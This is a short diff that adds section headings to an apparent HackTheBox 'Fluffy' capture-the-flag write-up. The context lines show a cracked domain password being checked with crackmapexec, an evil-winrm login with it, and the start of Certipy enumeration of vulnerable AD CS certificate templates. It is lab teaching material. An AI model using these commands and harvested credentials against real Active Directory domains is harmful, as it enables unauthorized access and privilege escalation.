@@ -324,7 +324,7 @@ Got the password `prometheusx-303`. Double check with `crackmapexec`.
 SMB         fluffy.htb      445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
 SMB         fluffy.htb      445    DC01             [+] fluffy.htb\p.agila:prometheusx-303
 ```
-
+## Initial Access
 Let's `winrm` as there is a open port `5985`.
 ```text
 └─$ evil-winrm -i 10.129.128.100 -u 'p.agila' -p 'prometheusx-303'
@@ -475,6 +475,7 @@ Session completed.
 
 Unable to crack :((. Let's go back to the approach we discussed from `0xdf` blog and using [Certipy](https://github.com/ly4k/Certipy) which is the tool for Active Directory Certificate Services enumeration and abuse.
 
+## Privilege Escalation
 ### Active Directory Certificate Services (AD CS)
 Let's use `find` to identify templates and `-vulnerable` to show the vulnerable result only.
 ```bash
